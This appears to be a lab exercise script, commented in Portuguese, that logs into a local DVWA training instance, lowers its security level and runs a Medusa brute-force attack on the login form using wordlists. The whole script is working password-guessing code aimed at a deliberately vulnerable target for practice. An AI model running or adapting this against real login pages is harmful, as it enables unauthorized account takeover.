#!/usr/bin/env bash
# 05 — Força bruta no formulário web do DVWA com Medusa.
# Autentica no DVWA, fixa security=low e ataca a página /vulnerabilities/brute/.
set -uo pipefail
TARGET="${TARGET:-192.168.56.102}"
BASE="$(cd "$(dirname "$0")/.." && pwd)"
cd "$BASE"
mkdir -p logs

COOKIES="$(mktemp)"
trap 'rm -f "$COOKIES"' EXIT

echo "== Preparando sessão no DVWA =="
curl -s -c "$COOKIES" "http://$TARGET/dvwa/login.php" -o /dev/null
curl -s -b "$COOKIES" -c "$COOKIES" \
  -d 'username=admin&password=password&Login=Login' \
  "http://$TARGET/dvwa/login.php" -o /dev/null
curl -s -b "$COOKIES" -c "$COOKIES" \
  -d 'security=low&seclev_submit=Submit' \
  "http://$TARGET/dvwa/security.php" -o /dev/null

SID="$(awk '$6=="PHPSESSID"{print $7}' "$COOKIES")"
echo "PHPSESSID: $SID"

echo
echo "== Baseline: credencial válida (admin/password) =="
curl -s -b "$COOKIES" \
  "http://$TARGET/dvwa/vulnerabilities/brute/?username=admin&password=password&Login=Login" \
  | grep -o 'Welcome to the password protected area[^<]*' \
  | tee logs/05-dvwa-baseline.txt

echo
echo "== Medusa :: formulário web (GET) =="
medusa -h "$TARGET" \
  -U wordlists/dvwa-users.txt \
  -P wordlists/dvwa-passwords.txt \
  -M web-form \
  -m FORM:"/dvwa/vulnerabilities/brute/" \
  -m FORM-DATA:"get?username=&password=&Login=Login" \
  -m DENY-SIGNAL:"Username and/or password incorrect" \
  -m CUSTOM-HEADER:"Cookie: PHPSESSID=$SID; security=low" \
  -t 1 -f -v 4 \
  -O logs/05-dvwa-medusa.log \
  2>&1 | tee logs/05-dvwa-console.txt
